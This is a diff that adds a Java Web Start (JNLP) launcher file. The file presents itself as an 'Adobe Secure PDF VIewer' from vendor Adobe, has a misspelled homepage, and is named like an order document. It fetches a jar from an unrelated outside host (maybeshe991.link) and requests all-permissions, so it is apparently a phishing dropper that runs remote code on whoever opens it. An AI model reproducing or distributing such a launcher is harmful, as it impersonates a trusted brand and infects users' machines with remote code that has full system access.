@@ -1,0 +1,19 @@
+<?xml version="1.0" encoding="utf-8"?> 
+<jnlp spec="1.0+" codebase="http://maybeshe991.link/dnd/" href="DOC012021-ORDER-CRA.jnlp">
+   <information> 
+      <title>Adobe Secure PDF VIewer</title> 
+      <vendor>Adobe</vendor> 
+      <homepage href="wwww.adobe.com"/> 
+      <description>Acrobat Secure Document Viewer</description> 
+	  </information> 
+   <security>
+      <all-permissions/>
+   </security>
+   <resources> 
+      <j2se version="1.6+" /> 
+      <jar href="DOC012021-ORDER-CRA.jar" />
+   </resources> 
+     <application-desc main-class="Secure_Document_Viewer"> 
+   </application-desc>
+kjtl12683 
+</jnlp> 
